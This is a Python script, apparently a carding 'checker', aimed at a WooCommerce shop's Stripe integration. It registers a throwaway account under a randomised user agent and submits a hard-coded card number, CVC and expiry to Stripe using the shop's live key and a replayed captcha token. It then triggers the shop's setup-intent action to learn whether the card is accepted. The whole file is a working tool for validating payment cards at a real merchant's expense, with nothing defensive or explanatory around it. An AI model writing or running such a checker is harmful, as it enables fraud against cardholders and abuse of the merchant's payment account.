import requests
from user_agent import generate_user_agent

r = requests.Session()
user = generate_user_agent()


headers = {
    'authority': 'aestheticjourneysdesigns.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://aestheticjourneysdesigns.com',
    'referer': 'https://aestheticjourneysdesigns.com/my-account/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user
}

data = {
    'email': 'TommyFightclub@gmail.com',
    'password': 'TommyFightclub@gmail.com',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://aestheticjourneysdesigns.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2026-05-03 16:57:56',
    'wc_order_attribution_session_pages': '4',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': '9c712ca8c3',
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}

response = r.post('https://aestheticjourneysdesigns.com/my-account/', cookies=r.cookies, headers=headers, data=data)



headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user
}

data = 'type=card&card[number]=5441+4645+8681+7532&card[cvc]=605&card[exp_year]=26&card[exp_month]=08&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F3e83e515d5%3B+stripe-js-v3%2F3e83e515d5%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Faestheticjourneysdesigns.com&time_on_page=78823&client_attribution_metadata[client_session_id]=7afa05bc-fe00-4a46-a011-83066a50eee1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1MVKcIDqyWv&client_attribution_metadata[elements_session_config_id]=137a7d01-c063-4b19-b37f-9368ff1db7fb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=d204f216-acba-4f0e-bc45-5dbeeb5f9fb064677e&muid=096dfe43-f0d9-44c8-b333-9d6d32d20a5bc716be&sid=bc64004e-eb3a-4360-84f1-30131a082369950284&key=pk_live_5185RlDK2SdlpCSYRF4CAg7pFKnamr2G8Z6uZIwTNc99xqg87Fn7GUCrhtdOEdYyST89TVcUd0sggbqFle7qVEakq00Ro7vdjvc&_stripe_version=2025-09-30.clover&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc3ODI3OTM1LCJjZGF0YSI6Ims2UXZkS2IzN1ppdEZkNFAzRE5udjRrWmRTZE1iRjFsUGhaRi9DZWtwbzAwK2RnMlp5Mmd6b212bHRUOExOQVJUNFhuYVo1Nm9oQ1did0lBOUx3eGFyRkxDSk1SZGJscnpHVHRYQkN3b25MY01qWVdxK0dNS2phbCtaaXJBWHdBbzVPK1RDMVdBNTVCa0g3SFZndXRyQlk5TFJXajJlRnEvNEhBT0hOek55M2NPOVovTFlGcEQxSlVyMGlzbVExRzh3S3lXMWUvbnBNUkM5MDRuUDVoOHRkWmlabDJFSHFvb29qUy9zb2ljcllSNVdNOUlta3JhWjZlais0ams3eVBhNUtnZzFMV0hpNUZtbjBuZUhnVHFFcXQwVVI2RENQcnJabVR2K01DWWdIQ1BlWldLQ1R6V1hwb0IzVzlaSlcxOGY0SjlDZXFtMzNhdHdtTW1adlVmbFFySkZ4cjFNblJsZzlmWDZIWU5VUT16NVB4ZHRHUFRGL1Ivek0vIiwicGFzc2tleSI6Ii9lY3ZUbUdhWDRSeDU3enB3Z3BRTlFDSWRGbzUwQ2gvK1RRa2VHeWxXblBVUFU4TW02TDA3SkphdjBPNHcwRkttOFhZNUV6YTE2a2NXZWlsZFJFUzdYSE8vUFVQTlJQYnNucTVoenNNbXNqRlNUK2M0OTBCMGpZRjFGM2VLa2c2QlI1ZS9mZVA4S29JajBiTkxPbEE2dm45dkhyTVdYSmxtL3F5WDZ5T1VUdlVnRHV0VThrWElxMXBLbjRVbWxCTHJIZzd1QUVaeisvVngvUzFpZXJSRm9QMkYvb0NWQnNiQ3YxcWN0cW9TLzRlbkd3cjBoU3FNSjkwOEUzc2E2Sk5xT3ROVzF6bFFqVS8zZVF1dUUza0dSelY5ZmwyajNaT2J6SWNZMTVBV21qZUNSOHdDYWZ4RW9SYnNydXJmWndoMDlPQk9CSGx4bkh0eE0xVDhhNWliaDlLdEVnTW1VV0w5bWVNekUzWWhmR1MrSjJFYzNXa29PMzN5a2hqQXRFOHFwRklqMitiTUh3OWZvdzdLRTJXbi9CMFRhdEN3TVpMdmNqd09oenhYWWZVSTc4T0g4R25LaGk1MDNBWFg0ZjVFSkRGaVEyRTFZQTdvOXFJNDYwN1FzelBtR3VmMllEUmR5U0dCWVljdHdTZWlPcHZpV2R5U0FVeVdMT2lHUlRWVW00OVhsZVZmNldSUTVzYzFqRFErTUExeDR3dmJGTXNpdUFjRDhEdDRjWXAzMHJCeXExMGhDYnRFeHNTOUxBclFIcjdRRFRsMW5kM01RMXd4Y2JHSUp6UjNyME5ONnpxWWlzR3ZqUjBOYjZuM3FTMDQ2dG1ZSEt0cUZrQy9IUi9sOGM0ejJka1B0RlVsMldORHNmaEV2MkNqditSZk1hU1E5ZmlyL1FVYUZLV1M4M1pQRzNuKzNjTFdDRTVJY1k3V0JlcXh5d3F1eXA5RnRKQ00xRlRmQS9jOENXcHJCdWZIdXNPeDBjSUxYdVF0bHZiMU8rY2pqcFpWdDUrb1loT05zc2ZDZ2ZtZWhYVjh4MWJWT0xncjRWUjZ3ZTFGNDFkTzMvSVd4OGVTTmUzNUdQNmlsOFh2ZTZWMlhpbVdBY2hqcXJwSWFQMFJuNHM0OTlvQW1yZm5TZUYyY0RoRGJ5anhDbDdpYW5rSjNhTnlvamFFMm9vMC9wMzcxMjE2WG84OVd0UlhCdW5XYkI3MjFxUVB3Vkd6K1lPRjhGKzUyS2k1TW4rajZvdWhvc3BKOHJlWThXbWxROG5WREVWdXpYVS9yOTFQcENtWFVLUEMrLzk1VHZKYXdIR0haWGk4MXJORlFtbTRzQUd3QlBuY2kvd1dPdjl6cGdYY3U1bGkwdzRhVVZYenY0Y0FzK2UzaVcyNHV5Mm54cURoL1pJMkE1QWtQMmNOWHhEeHRiSEhBb25WY0tVRUpPLzBOSEtNR3BnZGpBdUVhNWZnMUZ0WDU3b05ub0lYd0RTcnhRdnA2dVYxS0o4VHByMVJ5S283eE02dTdHRStuaXlwaHo3V1o3NzdvaE96VTlWak9IVEw5anJ2MFgwWUVnRjZYL1E2YzVTckdKQmx4R1FxcHo5czk2TjN1aC93aFMwYUJid1Q1WmFOc1BrSCtzRkRqWm1xRnhyVTM5QzVUc0Rib2VkS1p0OXNVbGtsRzJ2MjgxbzNYTVFOdFNGRzMvNkdib0hHUTU5YlRjVWM3YmNhSmJNbzhKb0IvTURReE1DV1JFbG44SUo3K216ai9ta1M2M3MvbkV3YWZTeWJqbStEUHA0MnBiU3g3dThETkYraWlmaGN5b1FBV2N6SEc3WWdvRzhZMWkvd245aG5YU1FEV2NlUFpMOTU1YUFzcGxyYlQ3YSs1Z1hvQ2NaSjE1Qmw1QVVKL2ZUT2lxaHNKR0I0eGQrRGlqUHpoVjE5dUdRZ20wMkN5b2pwdytOSklhUjZuSm45QTk0MlJUcnBQTUFpdHQ4alY5S2p1d1MwQ3FDMG1OTFY4bUNHQ0U2WGRGWUVjQXlEaUFhQzNtaG9RZUJsL1NYWXg3Sjd6U0E2OWFMcSsyN2g3bzlycUo1elVYNXE3TTZWS2tIazdFYlNqM2ZJZjMzS3p4VW5KRHk4N25xUDZYdU1KUlh0Y1I4VzhmUXQ3aVFJOE41ZHl2VkpGckVaV3ZlMC9aN2EwQlRaQjJhU0lka3JFa3VJVGFHb3hUSHFXa2tUV1hrSUNKVExzd0J6a0FBdmxBSEVnWlREclZNNE4ycHpKaDJwc3k0TzhhNHB3K01kMzRLZ3l6YTlTMlduNGh6ekNIMUhxNG9iRTJSOTZyWGlzR1Q4SzJiai8vREdLRGZQWkliaXhEL1NKdnRKKzB4WWZXMUNEMzRmTHFJK21mcHRjc2V1bktMSFZVZXVSTVBDaXVUYVdKOC8wc3IxVlZKbjk5enUwNEZRc0Z6NmkrRklPbGxkdXB2enRNNXgrM0lBSnJEbXNMTUU3bmE5dmlpVXZrOVZlRC8xcTVsMThTdWNnVWczenN5aEw3aWQycXpRZWcwcmpJb2JPa2Y4cGI4THFLWTg5SE1yTmNGeUYvaFplVC9valpEa05ONFlEajd3NFllL205RWcrWDNnK3BTU2pmQWZCa3VGVHZBbWgxV2M5SFdYQ2tGbUJuOEprbnpkRTBPVUtFUmM5TTFpY054UHpGQkgzK2FhQktjYmpRc1M3M0RiN0FOZlE1SkhGM2w2Mk5YbU92c1RabS81ZjMrVjhJMnB1Yz0iLCJrciI6IjI5NzUxM2MyIiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.ewST6ill4t-Mj54Gu-coTggOCityQCXwvAyLqrHJNR8'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)


id = response.json()['id']


headers = {
    'authority': 'aestheticjourneysdesigns.com',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://aestheticjourneysdesigns.com',
    'referer': 'https://aestheticjourneysdesigns.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'action': 'wc_stripe_create_and_confirm_setup_intent',
    'wc-stripe-payment-method': id,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '6470bcbb0c',
}

response = r.post(
    'https://aestheticjourneysdesigns.com/wp-admin/admin-ajax.php',
    cookies=r.cookies,
    headers=headers,
    data=data,
)


print(response.text)


#DevBy-Tommy